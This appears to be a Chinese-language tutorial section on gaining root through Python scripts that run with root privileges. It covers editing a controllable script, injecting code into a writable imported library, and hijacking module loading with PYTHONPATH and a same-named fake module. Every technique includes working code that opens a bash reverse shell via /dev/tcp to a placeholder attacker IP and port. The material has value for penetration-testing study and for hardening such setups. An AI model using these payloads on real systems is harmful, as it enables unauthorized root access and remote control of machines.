## 脚本内容本身可控

如果我们以root用户执行一个python脚本时，并且脚本内容可控，那么我们可以尝试直接在脚本中插入恶意代码

```
import os
os.system("bash -c 'bash -i >& /dev/tcp/攻击者IP/端口 0>&1'")
```

这种方式会直接反弹一个shell到指定的ip和端口

由于脚本以root权限运行，反弹的shell也将拥有root权限





### 脚本内容不可控

当脚本内容我们不可控，但是脚本依赖某个python库（通过import语句加载的模块），并且我们有权限修改该python库的内容时就可以注入恶意代码。

假设脚本调用了某个自定义库mylib

```
# 原脚本
import mylib
mylib.some_function()
```

那么我们就可以修改mylib函数库的some_function函数，注入恶意代码

```
# 修改后的 mylib.py
import sys
import os

def some_function():
    os.system("bash -c 'bash -i >& /dev/tcp/攻击者IP/端口 0>&1'")
```



### 劫持环境变量或模块加载路径

如果无法直接修改目标库，但可以控制Python的模块加载路径（例如通过环境变量PYTHONPATH），可以创建一个伪造的同名模块，注入恶意代码

首先查看脚本调用的模块名，如

```
import mylib
```

接着创建一个同名文件mylib.py

```
# 伪造的 mylib.py
import os

def some_function():
    os.system("bash -c 'bash -i >& /dev/tcp/攻击者IP/端口 0>&1'")
    # 可选：调用原始函数，避免功能异常
```

修改环境变量PYTHONPATH，将伪造模块所在的目录优先级提升

```
export PYTHONPATH=/path/to/fake_module:$PYTHONPATH
python example.py
```

这样python会优先加载/path/to/fake_module/mylib.py，从而执行恶意代码
